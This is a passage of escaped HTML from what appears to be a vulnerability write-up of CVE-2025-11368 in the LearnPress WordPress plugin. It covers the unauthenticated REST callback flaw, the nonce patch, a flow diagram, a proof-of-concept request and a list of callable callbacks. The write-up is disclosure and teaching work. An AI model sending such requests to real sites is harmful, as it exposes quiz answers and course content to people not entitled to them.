class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;status&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;message&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Success!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Throwable&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;status&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;message&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives &lt;code&gt;callback&lt;/code&gt; and &lt;code&gt;args&lt;/code&gt; from the request, decodes JSON if using GET, checks whether the callback contains both &lt;code&gt;class&lt;/code&gt; and &lt;code&gt;method&lt;/code&gt;, builds the string &lt;code&gt;class:method&lt;/code&gt; and checks it against the valid callbacks list from the filter; if present, checks if class–method is callable and executes &lt;code&gt;call_user_func&lt;/code&gt; with &lt;code&gt;$args&lt;/code&gt;, receives &lt;code&gt;$data&lt;/code&gt;, and returns it in the response.&lt;/p&gt;&#xA;&lt;p&gt;A series of callbacks are registered via &lt;code&gt;add_filter&lt;/code&gt; for &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;Register callbacks for filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Register callbacks for filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34; height=&#34;948&#34; width=&#34;793&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Register callbacks for filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;allow_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callbacks&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callbacks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_class&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:render_edit_quiz&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callbacks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_class&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:render_list_items_not_assign&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callbacks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives the existing &lt;code&gt;$callbacks&lt;/code&gt; array, adds two strings in the format &lt;code&gt;ClassName:method&lt;/code&gt;, and returns the array for WordPress to use as the allowed callback list. While debugging, all registered callbacks appear:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;List of allowed callbacks&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;List of allowed callbacks&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34; height=&#34;869&#34; width=&#34;955&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;List of allowed callbacks&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability arises because the API performs no capability or permission checks.&lt;/strong&gt;&#xA;This allows any user—including unauthenticated attackers—to call the endpoint and execute any callback from the registered callback list, even those intended for admin-only templates.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The patch (v4.3.0)&lt;/strong&gt; adds a permission validation step in &lt;code&gt;get_content&lt;/code&gt; by checking the request’s &lt;code&gt;X-WP-Nonce&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;X-WP-Nonce&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_rest&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;invalid&amp;ensp;nonce!&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the nonce is invalid or missing, the request is blocked immediately, preventing unauthorized users from accessing callbacks intended for admin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#39; alt=&#34;Diff&#34; height=&#34;790&#34; width=&#34;1863&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Unauthenticated&amp;ensp;attacker&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Sends&amp;ensp;request&amp;ensp;to&amp;ensp;REST&amp;ensp;API:&amp;ensp;/wp-json/lp/v1/load_content_via_ajax&#34;]&#xD;&#xA;--&gt;&amp;ensp;C[&#34;Request&amp;ensp;includes&amp;ensp;callback&amp;ensp;(class&amp;ensp;+&amp;ensp;method)&amp;ensp;and&amp;ensp;args&amp;ensp;(lesson,&amp;ensp;quiz,&amp;ensp;material&amp;ensp;IDs...)&#34;]&#xD;&#xA;--&gt;&amp;ensp;D[&#34;API&amp;ensp;receives&amp;ensp;request&amp;ensp;→&amp;ensp;invokes&amp;ensp;get_content()&#34;]&#xD;&#xA;--&gt;&amp;ensp;E[&#34;permission_callback&amp;ensp;=&amp;ensp;__return_true&amp;ensp;→&amp;ensp;no&amp;ensp;capability&amp;ensp;checks&#34;]&#xD;&#xA;--&gt;&amp;ensp;F[&#34;get_content()&amp;ensp;validates&amp;ensp;params&amp;ensp;but&amp;ensp;performs&amp;ensp;no&amp;ensp;permission&amp;ensp;or&amp;ensp;capability&amp;ensp;validation&#34;]&#xD;&#xA;--&gt;&amp;ensp;G[&#34;Constructs&amp;ensp;class:method&amp;ensp;and&amp;ensp;verifies&amp;ensp;it&amp;ensp;against&amp;ensp;allowed&amp;ensp;callbacks&amp;ensp;via&amp;ensp;lp/rest/ajax/allow_callback&#34;]&#xD;&#xA;--&gt;&amp;ensp;H[&#34;Callback&amp;ensp;is&amp;ensp;valid&amp;ensp;but&amp;ensp;intended&amp;ensp;for&amp;ensp;admin-only&amp;ensp;template&amp;ensp;rendering&#34;]&#xD;&#xA;--&gt;&amp;ensp;I[&#34;API&amp;ensp;executes&amp;ensp;the&amp;ensp;method&amp;ensp;using&amp;ensp;call_user_func([class,&amp;ensp;method],&amp;ensp;args)&#34;]&#xD;&#xA;--&gt;&amp;ensp;J[&#34;Template&amp;ensp;method&amp;ensp;renders&amp;ensp;sensitive&amp;ensp;HTML&amp;ensp;such&amp;ensp;as&amp;ensp;curriculum,&amp;ensp;quiz&amp;ensp;content,&amp;ensp;answers,&amp;ensp;or&amp;ensp;course&amp;ensp;materials&#34;]&#xD;&#xA;--&gt;&amp;ensp;K[&#34;Sensitive&amp;ensp;data&amp;ensp;is&amp;ensp;returned&amp;ensp;to&amp;ensp;the&amp;ensp;attacker&amp;ensp;through&amp;ensp;the&amp;ensp;REST&amp;ensp;API&#34;]&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request as an unauthenticated user:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;callback[class]=LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&amp;amp;callback[method]=render_list_items_not_assign&amp;amp;args[quiz_id]=483&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34; height=&#34;807&#34; width=&#34;1315&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;List of other allowed callbacks:&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_courses&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_courses&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Course\SingleCourseTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_html_comments&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;renderContent&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_edit_course_curriculum&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_list_items_not_assign&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_edit_quiz&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_list_items_not_assign&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_edit_question&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\TemplateHooks\Course\CourseMaterialTemplate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_material_items&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_courses&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_courses&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_courses&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType&lt;/span&gt;&lt;span 